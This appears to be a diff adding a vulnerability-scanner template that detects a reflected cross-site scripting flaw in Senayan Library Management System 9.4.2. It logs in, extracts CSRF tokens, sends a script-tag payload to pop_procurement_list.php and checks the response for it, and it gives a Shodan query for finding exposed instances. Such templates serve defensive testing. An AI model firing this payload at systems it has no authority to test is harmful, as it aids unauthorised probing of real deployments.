@@ -1,0 +1,69 @@
+id: slims-9-xss-index-ppl
+
+info:
+  name: Senayan Library Management System v9.4.2 (Bulian) - Cross-Site Scripting
+  author: nblirwn
+  severity: medium
+  description: |
+    SLiMS 9.4.2 (Bulian) vulnerable to Cross-Site Scripting via pop_procurement_list.php.
+  reference:
+    - https://github.com/slims/slims9_bulian/issues/173
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: slims
+    product: senayan_library_management_system
+    shodan-query: html:"SLIMS"
+  tags: senayan,xss,slims
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /index.php?p=login HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /index.php?p=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userName={{username}}&passWord={{password}}&_csrf_token_{{csrf_token}}={{csrf_token2}}&logMeIn=Login
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        part: body
+        group: 1
+        regex:
+          - 'name="_csrf_token_([a-f0-9]+)"'
+        internal: true
+
+      - type: regex
+        name: csrf_token2
+        part: body
+        group: 1
+        regex:
+          - 'value="([a-f0-9]+)"/>'
+        internal: true
+
+  - raw:
+      - |
+        GET /admin/modules/reporting/customs/pop_procurement_list.php?filter=%3Cscript%3Ealert(document.domain);%3C/script%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<script>alert(document.domain);</script>'
+
+      - type: word
+        part: content_type
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
